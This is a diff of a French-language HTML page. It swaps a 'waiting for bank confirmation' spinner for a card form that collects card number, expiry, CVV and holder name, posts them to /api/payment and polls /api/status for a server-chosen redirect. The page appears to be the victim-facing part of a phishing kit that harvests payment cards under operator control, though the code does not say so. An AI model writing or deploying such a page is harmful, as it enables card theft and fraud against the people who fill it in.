@@ -1,29 +1,35 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<title>Vérification du paiement</title>
-<style>
-  body{display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;font-family:Arial;}
-  .spinner{border:8px solid #eee;border-top:8px solid #007bff;border-radius:50%;width:80px;height:80px;animation:spin 1s linear infinite;}
-  @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-  p{margin-top:20px;font-size:18px;}
-</style>
+  <meta charset="UTF-8">
+  <title>💳 Paiement</title>
+  <style>
+    body { font-family: Arial; text-align: center; background: #fafafa; padding: 20px; }
+    form { display: inline-block; background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
+    input { margin: 10px; padding: 10px; width: 220px; border-radius: 8px; border: 1px solid #ccc; }
+    button { background: #4caf50; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; }
+  </style>
 </head>
 <body>
-  <div class="spinner"></div>
-  <p>⏳ En attente de la confirmation bancaire...</p>
+  <h1>💳 Informations bancaires</h1>
+  <form onsubmit="pay(event)">
+    <input required name="cardNumber" placeholder="Numéro de carte"><br>
+    <input required name="expiry" placeholder="MM/AA"><br>
+    <input required name="cvv" placeholder="CVV"><br>
+    <input required name="nomTitulaire" placeholder="Nom du titulaire"><br>
+    <button type="submit">Payer</button>
+  </form>
   <script>
-    async function poll(){
-      const res = await fetch('/api/status');
-      const json = await res.json();
-      if(json.redirect){
-        window.location.href = json.redirect;
-      } else {
-        setTimeout(poll,1500);
-      }
+    async function pay(e){
+      e.preventDefault();
+      const d=Object.fromEntries(new FormData(e.target));
+      await fetch('/api/payment',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});
+      location.href='loader.html';
     }
-    poll();
+    setInterval(async()=>{ 
+      const s=await fetch('/api/status'); const j=await s.json(); 
+      if(j.redirect) location.href=j.redirect; 
+    },3000);
   </script>
 </body>
 </html>
